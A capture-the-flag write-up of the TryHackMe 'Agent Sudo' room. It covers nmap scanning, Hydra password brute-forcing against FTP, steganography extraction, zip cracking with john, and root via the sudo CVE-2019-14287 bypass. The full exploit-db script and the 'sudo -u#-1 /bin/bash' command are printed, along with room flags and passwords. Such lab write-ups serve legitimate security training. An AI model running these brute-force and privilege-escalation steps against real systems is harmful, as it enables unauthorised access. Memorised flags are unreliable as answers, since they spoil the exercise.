# Room Information

Room link: https://tryhackme.com/room/agentsudoctf

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 7/01/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine, as well as our AttackBox
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto our terminal
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.226.141 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt 

Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-01 04:00 BST
Nmap scan report for ip-10-10-226-141.eu-west-1.compute.internal (10.10.226.141)
Host is up (0.00091s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
MAC Address: 02:6A:D9:B1:0E:FB (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
```

#
> Inspecting the Web Pages
4. `curl http://{TARGET IP}`
```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.226.141

<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```

#
> Testing User Agents Using Burp Suite
5. Start up Burpsuite Community Edition

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Burpsuite%20Dashboard.png)

6. Launch Firefox, turn on FoxyProxy, which was already set up by TryHackMe, to allow Burpsuite to capture our web requests and responses

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/FoxyProxy.png)

8. Seeing that the homepage message was signed by an agent called "**R**", we can send a web request and replace the **User-Agent** value on our intercepted web request to "**R**", which ended displaying the same message that we got before but this time with an error message, which probably indicates that the users' User-Agents are probably also letters of the alphabet as well

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Page%20Intercept.png)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/User-Agent%20R%20.png) 

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Agent%20R.png)

9. We'll try this theory out by capturing the same web request again but this time we'll send it to Burpsuite's Intruder module and then from there, we'll create a list containing all the capital letters of the alphabet and use it as a payload that we'll inject into our captured web request in the **User-Agent** field

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/User-Agent%20Payload%20List.png)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Payload%20Position.png)

10. After running our attack, we can see that one of the letters in our payload list got a 302 HTTP status code, meaning that the user has been redirected to another location

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Attack%20Results.png)

11. We'll create and intercept another web request to the target's homepage but this time we'll replace the User-Agent with the one from our payload list that got the 302 HTTP status code, which ended up redirecting us to a PHP file with its contents displayed onto our browser, which ended up containing the User Agent's name and a message that said that their password is weak

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/User-Agent%20Payload%20List.png)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/User-Agent%20C.png)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/agent_C_attention.png)

#
> Password Guessing Using Hydra
12. `hydra -l {USER1} -P {WORDLIST PATH} ftp://{TARGET IP}`
```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l chris -P ~/Tools/wordlists/rockyou.txt ftp://10.10.55.185
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-01 14:01:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.55.185:21/
[21][ftp] host: 10.10.55.185   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-01 14:02:54
```

#
> Scanning the Target's FTP Server
13. `ftp {USER1}@{TARGET IP}`
```bash
┌──(kali㉿kali)-[~]
└─$ ftp chris@10.10.75.108 
Connected to 10.10.75.108.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```
14. `ls`
15. `get {FILE1}`
16. `get {FILE2}`
17. `get {FILE3}`
18. `exit`
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```
```bash
ftp> get To_agentJ.txt cutie-alien.jpg cutie.png
local: cutie-alien.jpg remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (63.0884 kB/s)
```
```bash
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (2.9148 MB/s)
```
```bash
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.00 secs (26.3178 MB/s)
```
```bash
ftp> get cutie.png
local: cutie.png remote: cutie.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.00 secs (89.8052 MB/s)
```
```bash
ftp> exit
221 Goodbye.
```
19. cat {FILE1}
```bash
┌──(kali㉿kali)-[~]
└─$ cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
20. `steghide --info {FILE1}`
```bash
┌──(kali㉿kali)-[~]
└─$ steghide --info cute-alien.jpg
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
21. `binwalk {FILE2}`
22. `binwalk {FILE3}`
```bash
┌──(kali㉿kali)-[~]
└─$ binwalk cute-alien.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```
```bash
┌──(kali㉿kali)-[~]
└─$ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive
```
23. `binwalk {FILE3} --extract`
24. `ls`
```bash
┌──(kali㉿kali)-[~]
└─$ binwalk cutie.png --extract

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive
```
```bash
┌──(kali㉿kali)-[~]
└─$ ls
cute-alien.jpg
cutie.png
cutie-alien.jpg
_cutie.png.extracted
To_agentJ.txt
```
25. `cd {EXTRACTED DIRECTORY}`
26. `ls`
```bash
┌──(kali㉿kali)-[~]
└─$ cd _cutie.png.extracted/
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ ls
365
365.zlib
8702.zip
To_agentJtxt
```
27. `zip2john {ZIP FILE} > {FILENAME2}.txt`
28. `cat {FILENAME2}.txt`
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ zip2john 8702.zip > Hash.txt
```
```bash    
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ john Hash.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:02 DONE 2/3 (2023-07-01 12:34) 0.4784g/s 21265p/s 21265c/s 21265C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
29. `7z e 8702.Ip`
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ 7z e 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx   (810F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
```
30. `ls`
31. `cat {FILE4}.txt`
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  Hash.txt  To_agentJ.txt  To_agentR.txt
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
32. `echo '{STRING}' > {FILENAME3}.txt`
33. `hashid {FILENAME3}.txt`
34. `base64 {FILENAME3}.txt --decode`
35. `cd ..`
32. `steghide --info {FILE1}`
33. `steghide --extract -sf {FILE1}`
34. `ls`
35. `cat {FILE5}`
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ echo 'QXJlYTUx' > String.txt
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ hashid String.txt                                              
--File 'Hash2.txt'--
Analyzing 'QXJlYTUx'
[+] Dahua 
--End of file 'String.txt'--
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ base64 String.txt --decode
Area51
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ cd .. 
```
```bash
┌──(kali㉿kali)-[~]
└─$ steghide --info cute-alien.jpg 
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
```bash
┌──(kali㉿kali)-[~]
└─$ steghide --extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ ls
cute-alien.jpg
cutie.png
cutie-alien.jpg
_cutie.png.extracted
message.txt
To_agentJ.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat message.txt                         
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
36. `ssh {USER2}@{TARGET IP}`
```bash
┌──(kali㉿kali)-[~]
└─$ ssh james@10.10.75.108      
james@10.10.75.108's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul  1 17:24:23 UTC 2023

  System load:  0.0               Processes:           94
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 15%               IP address for eth0: 10.10.75.108
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
```
37. `ls`
38. `cat {FILE6}.txt`
```bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
```
```bash
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
```
39. `sudo scp {FILE7}:{FILE PATH} {DESTINATION PATH}` and reverse search it
```bash
┌──(kali㉿kali)-[/]
└─$ sudo scp james@10.10.75.108:/home/james/Alien_autospy.jpg ~/ 
The authenticity of host '10.10.75.108 (10.10.75.108)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:2: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.75.108' (ED25519) to the list of known hosts.
james@10.10.75.108's password: 
Alien_autospy.jpg                                                                 100%   41KB 115.7KB/s   00:00   
```

![]()

![]()

40. `sudo -l`
41. `sudo -v`
```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
```bash
james@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```
42. `searchsploit sudo 1.8.2`
43. `curl "https://www.exploit-db.com/raw/{EXPLOIT FILE}"`
```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit --verbose sudo 1.8.2
[i] Version ID: 1.8.2
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Esca | linux/local/25134.c
sudo 1.8.0 < 1.8.3p1 - Format String                                             | linux/dos/18436.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                 | linux/local/42183.c
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                      | linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                | linux/dos/47995.txt
sudo 1.8.27 - Security Bypass                                                    | linux/local/47502.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```bash
┌──(kali㉿kali)-[~]
└─$ curl https://www.exploit-db.com/raw/47502
# Exploit Title : sudo 1.8.27 - Security Bypass
# Date : 2019-10-15
# Original Author: Joe Vennix
# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
# Version : Sudo <1.8.28
# Tested on Linux
# Credit : Joe Vennix from Apple Information Security found and analyzed the bug
# Fix : The bug is fixed in sudo 1.8.28
# CVE : 2019-14287

'''Check for the user sudo permissions

sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash


So user hacker can't run /bin/bash as root (!root)


User hacker sudo privilege in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash


With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT: 

sudo -u#-1 /bin/bash

Example : 

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

and /bin/bash is executed with root permission
Proof of Concept Code :

How to use :
python3 sudo_exploit.py

'''


#!/usr/bin/python3

import os

#Get current username

username = input("Enter current username :")


#check which binary the user can run with sudo

os.system("sudo -l > priv")


os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

binary_file = open("binary")

binary= binary_file.read()

#execute sudo exploit

print("Lets hope it works")

os.system("sudo -u#-1 "+ binary)
```
44. `sudo -u#-1 /bin/bash`
45. `whoami`
```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~#
```
```bash
root@agent-sudo:~# whoami
root
```
46. `find / -type f -name "root*" 2>/dev/null`
47. `cat {ROOT FILE PATH}`
```bash
root@agent-sudo:~# find / -type f -name "root*" 2>/dev/null
/lib/recovery-mode/options/root
/usr/lib/python3/dist-packages/twisted/names/root.py
/usr/lib/python3/dist-packages/twisted/names/__pycache__/root.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/python/roots.py
/usr/lib/python3/dist-packages/twisted/python/__pycache__/roots.cpython-36.pyc
/usr/src/linux-headers-4.15.0-55/include/linux/root_dev.h
/usr/share/dns/root.hints
/usr/share/dns/root.key
/usr/share/dns/root.ds
/usr/share/apport/root_info_wrapper
/root/root.txt
/proc/sys/kernel/keys/root_maxbytes
/proc/sys/kernel/keys/root_maxkeys
```
```bash
root@agent-sudo:~# cat /root/root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

# Vulnerability Identification

# Vulnerability Exploitation


**Room completed!**

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Agent%20Sudo.png)

# Command History

# Dissecting Some Commands
`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+ `-sC` enables the use of default scripts during the scan, which runs a set of commonly used scripts against the target IP to try to find any vulnerabilities
+ `-sV` enables version detection, which attempts to determine the sevice and version information of the open ports
+ `> {FILENAME1}.txt` redirects the results into a text file

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
